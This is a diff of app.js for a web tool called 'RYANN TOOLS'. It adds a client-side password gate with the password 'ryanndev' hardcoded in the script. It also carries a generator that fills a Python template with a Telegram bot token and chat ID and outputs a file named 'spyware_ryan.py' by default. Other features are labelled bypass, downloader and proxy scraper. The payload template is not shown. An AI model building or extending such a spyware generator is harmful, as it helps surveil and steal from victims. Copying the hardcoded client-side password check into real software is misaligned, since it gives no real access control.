@@ -1,6 +1,112 @@
-// app.js v6.1 — Logic utama RYANN TOOLS
+// app.js v6.2 — Logic utama RYANN TOOLS + Password Gate
 (function(){
 'use strict';
+
+// ============================================================
+// PASSWORD GATE v6.2 — layer pertama sebelum website utama
+// ============================================================
+(function passwordGateInit(){
+  var PASSWORD = 'ryanndev'; // 8 karakter
+  var gate = document.getElementById('passwordGate');
+  if(!gate) return;
+
+  var card = gate.querySelector('.access-card');
+  var input = document.getElementById('passwordInput');
+  var boxes = gate.querySelectorAll('.password-box');
+  var boxesWrap = gate.querySelector('.password-boxes');
+  var statusText = document.getElementById('statusText');
+  var continueBtn = document.getElementById('continueBtn');
+  var verified = false;
+
+  if(!input || !boxesWrap || !continueBtn) return;
+
+  // klik area box → fokus input
+  boxesWrap.addEventListener('click', function(){ input.focus(); });
+
+  // input handler
+  input.addEventListener('input', function(){
+    var value = input.value.slice(0, 8);
+    Array.prototype.forEach.call(boxes, function(box, index){
+      box.classList.remove('filled');
+      box.classList.remove('active');
+      if(index < value.length){
+        box.textContent = '•';
+        box.classList.add('filled');
+      } else {
+        box.textContent = '';
+      }
+    });
+    if(value.length < 8 && boxes[value.length]) boxes[value.length].classList.add('active');
+    statusText.classList.remove('ok','err','success');
+    statusText.textContent = value.length === 8 ? 'PRESS ENTER TO VERIFY' : 'WAITING FOR PASSWORD';
+  });
+
+  // Enter
+  input.addEventListener('keydown', function(event){
+    if(event.key === 'Enter') verifyPassword();
+  });
+
+  // CONTINUE button
+  continueBtn.addEventListener('click', function(){
+    if(input.value.length === 8 && !verified){ verifyPassword(); return; }
+    if(verified){
+      gate.classList.add('gate-hidden');
+      setTimeout(function(){ gate.style.display = 'none'; }, 600);
+    }
+  });
+
+  // Verify
+  function verifyPassword(){
+    if(input.value !== PASSWORD){
+      card.classList.remove('shake');
+      void card.offsetWidth;
+      card.classList.add('shake');
+      statusText.textContent = 'INVALID PASSWORD';
+      statusText.classList.add('err');
+      Array.prototype.forEach.call(boxes, function(box){
+        box.textContent = '';
+        box.classList.remove('filled','active','error','success');
+        box.classList.add('error');
+      });
+      setTimeout(function(){
+        Array.prototype.forEach.call(boxes, function(box){ box.classList.remove('error'); });
+      }, 600);
+      input.value = '';
+      setTimeout(function(){
+        Array.prototype.forEach.call(boxes, function(box){ box.textContent = ''; box.classList.remove('error'); });
+        boxes[0].classList.add('active');
+        statusText.textContent = 'WAITING FOR PASSWORD';
+        statusText.classList.remove('err');
+      }, 700);
+      return;
+    }
+
+    // Benar
+    verified = true;
+    statusText.textContent = 'VERIFYING ACCESS...';
+    statusText.classList.remove('err');
+    statusText.classList.add('ok');
+    Array.prototype.forEach.call(boxes, function(box){ box.classList.remove('active'); });
+    boxesWrap.classList.add('verifying');
+
+    setTimeout(function(){
+      boxesWrap.classList.remove('verifying');
+      Array.prototype.forEach.call(boxes, function(box){
+        box.textContent = '✓';
+        box.classList.add('success');
+      });
+      card.classList.add('success');
+      statusText.textContent = 'ACCESS VERIFIED';
+      statusText.classList.remove('ok');
+      statusText.classList.add('success');
+      continueBtn.textContent = 'CONTINUE';
+      continueBtn.classList.add('ready');
+    }, 1800);
+  }
+
+  // autofocus kalau di desktop
+  setTimeout(function(){ try{ input.focus(); }catch(e){} }, 300);
+})();
 
 function $(i){ return document.getElementById(i); }
 var $$ = function(q){ return document.querySelectorAll(q); };
@@ -11,7 +117,7 @@ var S = {
   del: function(k){ try{ localStorage.removeItem('rx_'+k); }catch(e){} }
 };
 
-// ===== CUSTOM SELECT ENGINE v6.1 — inline list =====
+// ===== CUSTOM SELECT ENGINE v6.2 — inline list =====
 window.initCustomSelect = function(containerId, items, selectedId, onSelect, opts){
   opts = opts || {};
   var container = document.getElementById(containerId);
@@ -191,7 +297,7 @@ window.unlockAch=unlockAch;
   if(skipBtn) skipBtn.onclick = function(){ closeWm(); };
 })();
 
-// ===== NAV BAWAH =====
+// ===== NAV =====
 (function(){
   var nav = document.getElementById('nav-main');
   var spot = document.getElementById('nav-spot');
@@ -216,21 +322,15 @@ window.unlockAch=unlockAch;
     var oldPg = document.getElementById('pg-' + currentPage);
     var newPg = document.getElementById('pg-' + name);
     if(!newPg) return;
-
     if(oldPg){
       oldPg.classList.remove('active');
       oldPg.classList.add('leaving');
-      setTimeout(function(){
-        oldPg.classList.remove('leaving');
-        oldPg.classList.add('hd');
-      }, 220);
+      setTimeout(function(){ oldPg.classList.remove('leaving'); oldPg.classList.add('hd'); }, 220);
     }
-
     newPg.classList.remove('hd');
     void newPg.offsetWidth;
     newPg.classList.add('active');
     currentPage = name;
-
     if(name === 'bp' && typeof window.zyInitBypass === 'function'){ try{ window.zyInitBypass(); }catch(e){} }
     if(name === 'dl' && typeof window.zyInitDownloader === 'function'){ try{ window.zyInitDownloader(); }catch(e){} }
     if(name === 'set' && typeof window.syncSettingsUI === 'function'){ try{ window.syncSettingsUI(); }catch(e){} }
@@ -289,9 +389,7 @@ function setBg(b){
   } else {
     document.body.style.backgroundImage = '';
   }
-  $$('#bg-grid .snd-opt').forEach(function(o){
-    o.classList.toggle('a', o.dataset.bg === b);
-  });
+  $$('#bg-grid .snd-opt').forEach(function(o){ o.classList.toggle('a', o.dataset.bg === b); });
 }
 $$('#bg-grid .snd-opt').forEach(function(o){
   o.addEventListener('click', function(){ setBg(o.dataset.bg); sndClick(); vib(); });
@@ -344,61 +442,43 @@ function inject(t,u){ var ls=t.split('\n'), li=-1; for(var i=0;i<ls.length;i++){
 (function(){
   var gulpBtn = document.getElementById('gulp-generate');
   if(!gulpBtn) return;
-
   gulpBtn.addEventListener('click', function(e){
     e.stopPropagation();
     if(gulpBtn.dataset.state === 'pending' || gulpBtn.dataset.state === 'eat' || gulpBtn.dataset.state === 'done') return;
-
     var uc = ($('ci')||{}).value ? $('ci').value.trim() : '';
     var tpl = ($('ts')||{}).value || (window.__selTemplate ? window.__selTemplate.getValue() : '');
     var sw = $('sw'), rc = $('rc');
-
     if(!uc){ if(sw) sw.innerHTML = '<div class="st-er">Code kosong</div>'; if(rc) rc.classList.add('hd'); sndError(); return; }
     if(!tpl){ if(sw) sw.innerHTML = '<div class="st-er">Pilih template</div>'; if(rc) rc.classList.add('hd'); sndError(); return; }
-
     gulpBtn.dataset.state = 'eat';
-
     setTimeout(function(){
       gulpBtn.dataset.state = 'pending';
       if(sw) sw.innerHTML = '<div class="st-in">⚙ Memproses...</div>';
-
       var t0 = performance.now();
       var bt = ($('bt')||{}).value ? $('bt').value.trim() : '';
       var ct = ($('ct')||{}).value ? $('ct').value.trim() : '';
-
       setTimeout(function(){
         var t = (tpl === 'command') ? (window.TEMPLATE_COMMAND || '') : (window.TEMPLATE_BASE || '');
-        if(!t){
-          if(sw) sw.innerHTML = '<div class="st-er">Template kosong</div>';
-          sndError();
-          gulpBtn.dataset.state = 'idle';
-          return;
-        }
-
+        if(!t){ if(sw) sw.innerHTML = '<div class="st-er">Template kosong</div>'; sndError(); gulpBtn.dataset.state = 'idle'; return; }
         var out = t;
         if(bt) out = out.replace(/BOT_TOKEN\s*=\s*['"][^'"]*['"]/g, 'BOT_TOKEN = "' + bt + '"');
         if(ct) out = out.replace(/CHAT_ID\s*=\s*['"][^'"]*['"]/g, 'CHAT_ID   = "' + ct + '"');
-
         var final = inject(out, uc);
         genCode = final;
         genBlob = new Blob([final], {type:'text/x-python'});
-
         var name = (($('on')||{}).value || 'spyware_ryan').trim() + '.py';
         var kb = (final.length/1024).toFixed(1);
         var ln = final.split('\n').length;
         var el = Math.round(performance.now() - t0);
-
         if(sw) sw.innerHTML = '<div class="st-ok">✓ Berhasil · ' + kb + ' KB · ' + el + 'ms</div>';
         if($('rm')) $('rm').textContent = name;
         if($('rs')) $('rs').textContent = ln + ' lines · ' + kb + ' KB';
         if(rc) rc.classList.remove('hd');
         sndSuccess();
-
         var h = S.get('history', []);
         h.unshift({n:name,s:kb,l:ln,t:Date.now(),c:final.substring(0,40000)});
         if(h.length > 30) h = h.slice(0,30);
         S.set('history', h);
-
         var g = S.get('generates', 0) + 1;
         S.set('generates', g);
         if($('st-g')) $('st-g').textContent = g;
@@ -406,7 +486,6 @@ function inject(t,u){ var ls=t.split('\n'), li=-1; for(var i=0;i<ls.length;i++){
         if(g >= 10)  unlockAch('ten');
         if(g >= 50)  unlockAch('fifty');
         if(g >= 100) unlockAch('hundred');
-
         gulpBtn.dataset.state = 'done';
         setTimeout(function(){ gulpBtn.dataset.state = 'idle'; }, 2500);
       }, 180);
@@ -479,7 +558,8 @@ if($('bp-run')) $('bp-run').onclick=function(){ sndClick(); if(typeof window.zyR
 if($('bp-clear')) $('bp-clear').onclick=function(){ $('bp-log').innerHTML=''; $('bp-log').classList.add('hd'); $('bp-result').innerHTML=''; $('bp-result').classList.add('hd'); sndClick(); };
 if($('dl-run')) $('dl-run').onclick=function(){ sndClick(); if(typeof window.zyRunDownloader==='function') try{ window.zyRunDownloader(); }catch(e){ alert('DL error: '+e.message); } else alert('zyvor.js gak load'); };
 if($('dl-run-all')) $('dl-run-all').onclick=function(){ sndClick(); if(typeof window.zyRunDownloaderAll==='function') try{ window.zyRunDownloaderAll(); }catch(e){ alert('DL error: '+e.message); } else alert('zyvor.js gak load'); };
-if($('dl-clear')) $('dl-clear').onclick=function(){ $('dl-log').innerHTML=''; $('dl-log').classList.add('hd'); $('dl-result').innerHTML=''; $('dl-result').classList.add('hd'); sndClick(); };
+if($('dl-preview')) $('dl-preview').onclick=function(){ sndClick(); if(typeof window.zyPreviewResult==='function') try{ window.zyPreviewResult(); }catch(e){ alert('Preview error: '+e.message); } };
+if($('dl-clear')) $('dl-clear').onclick=function(){ sndClick(); if(typeof window.zyClearDownloader==='function') try{ window.zyClearDownloader(); }catch(e){ alert('Clear error: '+e.message); } };
 
 // ===== PROXY SCRAPER =====
 var scrResults=[], scrRunning=false, SCR_CD=15*60*1000;
@@ -625,9 +705,7 @@ if($('tplexp')) $('tplexp').onclick=function(){ var t=$('tplarea').value; if(!t)
 function gulpMiniHTML(idx){
   return '<button class="gulp-mini" data-state="idle" data-idx="'+idx+'" type="button">'+
     '<span class="gulp_face">'+
-      '<svg class="gulp_icon" viewBox="0 0 24 24"><path d="M4 7h16"/><path d="M9 7V5a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/><path d="M6 7l1 12a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2l1-12"/></svg>'+
-      'DELETE'+
-    '</span>'+
+      '<svg class="gulp_icon" viewBox="0 0 24 24"><path d="M4 7h16"/><path d="M9 7V5a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/><path d="M6 7l1 12a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2l1-12"/></svg>DELETE</span>'+
     '<svg class="gulp_bin" viewBox="0 0 24 24">'+
       '<circle cx="12" cy="12" r="10" fill="none" stroke="rgba(0,0,0,.4)" stroke-width="1"/>'+
       '<path class="gulp_lid" d="M8 9h8l-1 9a2 2 0 0 1-2 2h-2a2 2 0 0 1-2-2L8 9z" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>'+
@@ -713,7 +791,6 @@ window.syncSettingsUI = syncSettingsUI;
 
 // ===== BOOT =====
 function boot(){
-  // custom selects
   try {
     window.__selTemplate = initCustomSelect('sel-template',
       [
